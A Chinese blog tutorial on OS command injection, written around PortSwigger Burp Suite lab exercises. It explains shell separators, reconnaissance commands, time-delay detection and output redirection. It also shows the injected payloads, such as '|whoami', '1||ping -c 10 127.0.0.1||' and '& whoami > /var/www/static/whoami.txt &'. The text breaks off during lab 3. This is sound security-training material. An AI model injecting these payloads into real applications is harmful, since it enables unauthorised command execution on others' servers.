#  【burpsuite靶场-服务端4】命令注入漏洞   
原创 underatted  泷羽Sec-underatted安全   2025-02-03 14:38  
  
# 免责声明：  
  
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我会立即删除并致歉。谢谢！  
# 1.简介  
  
在本节中，我们将解释什么是操作系统命令注入，描述如何检测和利用漏洞，详细说明 适用于不同操作系统 的一些有用命令和技术，并总结如何防范操作系统命令注入。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuaWImma2GATnsyX6vAiabCibKBVFmNBWg2cdq7c1d6695eOyJfWMGOdicw/640?wx_fmt=png&from=appmsg "")  
  
## 1.1 什么是OS命令注入？  
  
OS 命令注入（也称为 shell 注入）是一个 Web 安全漏洞，允许攻击者在运行应用程序的服务器上 执行任意操作系统（OS）命令，这可能会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞，来危害其他的主机或基础设施，利用信任关系 将攻击转移到组织内的其他系统。  
## 1.2 执行任意命令  
  
假设有一个购物类型的应用程序，它允许用户查看 特定商店中的某个商品 是否有库存。此信息可通过以下 URL 来访问：  
```
https://insecure-website.com/stockStatus?productID=381&storeID=29

```  
  
为了提供库存信息，应用程序必须查询各种遗留系统。由于历史原因，该功能是以 productID 和 storeID 作为参数，然后调用 shell 命令来实现的：  
```
stockreport.pl 381 29

```  
  
此命令输出指定商品的库存状态，并将状态返回给用户。  
  
由于应用程序未对 OS命令注入实施防御，因此攻击者可以提交以下输入来执行任意命令：  
```
& echo aiwefwlguh &

```  
  
如果此输入是在 productID  
 参数中提交的，则应用程序执行的命令为：  
```
stockreport.pl & echo aiwefwlguh & 29

```  
  
echo  
命令的作用 只是使提供的字符串在输出中回显，并且是测试某些类型的 OS命令注入的有用方法。&  
字符是一个 shell 命令分隔符，因此实际上执行的是三个独立的命令。最后，返回给用户的输出为：  
```
Error - productID was not provided
aiwefwlguh
29: command not found

```  
  
这三行输出表明：  
- 原先的stockreport.pl  
命令 在没有预期参数的情况下执行，因此返回了错误消息。  
  
- 执行注入的echo  
命令，在输出中回显了提供的字符串。  
  
- 原始参数29  
被作为命令而执行，这导致了错误。  
  
将附加命令分隔符&  
放在注入的命令之后 通常很有用，因为它将注入的命令 与 注入点之后的任何命令分隔开。这降低了 后续内容阻止注入命令被执行 的可能性。  
  
命令连接符号来拼接自己的命令：  
- productId=1&storeId=1|whoami  
 POST方法不能用&  
  
<table><thead><tr><th valign="top" style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">符号</span></section></th><th valign="top" style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A;B</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A 不论正确与否都会执行 B 命令</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A&amp;B</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A 后台运行，A 和 B 同时执行</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A&amp;&amp;B</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A 执行成功时候才会执行 B 命令</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A|B</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A||B</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">A 执行失败后才会执行 B 命令</span></section></td></tr></tbody></table>  
### 实验1：操作系统命令注入，简单案例  
  
随便查看一个库存![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuZWJ78PNCicVaEfsP1Cdn9ADAjc7pAlcW2ibjM4or9ibWbgvq5SArJj41A/640?wx_fmt=png&from=appmsg "")  
有传参![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuGePFfFKx5AnpSyVJm3JNMfM74hjVRmBxr1f7zTnBL7HyxOUy9VTa7g/640?wx_fmt=png&from=appmsg "")  
直接加 |whoami，执行成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuPdNvrugd50MG6haY5vwLS73XsPrcrek73yF25xKbic5FpI2JbnTSuEg/640?wx_fmt=png&from=appmsg "")  
  
## 1.3可用的命令  
  
当识别出 OS命令注入漏洞后，通常需要执行一些初始命令，以获取 被入侵系统 的有关信息。以下是一些在 Linux 和 Windows 平台上可用的命令总结：  
  
<table><thead><tr><th valign="top" style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">命令用途</span></section></th><th valign="top" style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">Linux</span></section></th><th valign="top" style="color: rgb(89, 89, 89);font-size: 15px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgb(240, 240, 240);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;"><section><span leaf="">Windows</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">当前用户名</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">whoami</span></code></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">whoami</span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">操作系统</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">uname -a</span></code></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">ver</span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">网络配置</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">ifconfig</span></code></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">ipconfig /all</span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">网络连接</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">netstat -an</span></code></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">netstat -an</span></code></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">正在运行的进程</span></section></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">ps -ef</span></code></td><td valign="top" style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">tasklist</span></code></td></tr></tbody></table>  
## 1.4 OS命令盲注漏洞  
  
许多 OS命令注入实例 都是盲注漏洞。这意味着应用程序不会在其 HTTP 响应中返回命令的输出。但盲注漏洞仍然可以被利用，但需要不同的技术。  
  
假设有一个网站，它允许用户提交关于该网站的反馈信息。用户输入他们的电子邮件地址 和 反馈消息。然后，服务器端应用程序 向站点管理员生成一封包含反馈的电子邮件。为此，它会调用邮件程序 并提交详细信息。例如：  
```
mail -s "这个网站很棒" -aFrom:peter@normal-user.net feedback@vulnerable-website.com

```  
  
mail  
命令的输出（如果有的话）不会在应用程序的响应中返回，因此，使用echo  
命令作为有效负载将无效。在这种情况下，你可以使用各种其他技术来检测和利用漏洞。  
### 1.4.1 使用时间延迟 检测OS命令盲注  
  
你可以使用 触发时间延迟 的注入命令，从而允许你 根据应用程序响应所需的时间，来确认命令是否已执行。ping  
命令是执行此操作的有效方法，因为它允许你指定要发送的 ICMP 数据包数量，从而指定命令运行所需的时间：  
```
& ping -c 10 127.0.0.1 &

```  
  
此命令将导致 应用程序对其环回网络适配器 执行 10 秒钟的 ping 操作。  
#### 实验2：具有时间延迟的OS命令盲注  
  
**实验目标：**  
应用程序执行包含用户提供的详细信息的shell命令。命令的输出不会在响应中返回，利用盲目的操作系统命令注入漏洞造成10秒的延迟。 找命令注入![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuRzhvnevREO8ETwOceJSDU6q3HOVtFszMjUL4BrdhukzbCCB5sStumg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuljE6ib1UDCq7P6VUExKp0cJ2F2schUfxj44Eh9gosZQOjSCfy1SPPmg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDuRzhvnevREO8ETwOceJSDU6q3HOVtFszMjUL4BrdhukzbCCB5sStumg/640?wx_fmt=png&from=appmsg "")  
利用1||ping -c 10 127.0.0.1||![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRFp0PtXfVibZPDOtnNLeDut0Rkbgl3NyMKtkPuuVIyMHtdNZs25Ee0HxryqbyFnl1WJtrGiaibyFJA/640?wx_fmt=png&from=appmsg "")  
  
### 1.4.2 通过输出重定向 利用OS命令盲注  
  
你可以将注入命令的输出，重定向到 Web 根目录中的文件中，然后使用浏览器检索该文件。例如，如果应用程序从文件系统位置/var/www/static  
提供静态资源，则可以提交以下输入：  
```
& whoami > /var/www/static/whoami.txt &

```  
  
字符>  
会将whoami  
命令的输出 发送到指定的文件。然后，你可以使用浏览器访问https://vulnerable-website.com/whoami.txt  
以检索文件，并查看注入命令的输出。  
#### 实验3：带输出重定向的盲操作系统命令注入  
  
**实验目标：**  
- 在 反馈功能 中，尝试利用 OS命令盲注漏洞，通过输出重定向来捕获命令的输出。  
  
- 将命令的输出 给重定向到对应目录下的文件中，然后通过 URL 加载该文件。 应用程序执行包含用户提供的详细信息的shell命令。命令的输出不会在响应中返回。但是，您可以使用输出重定向来捕获命令的输出。有一个可写文件夹，位于：  
  
/var/www/images//var/www/szczczczc/  
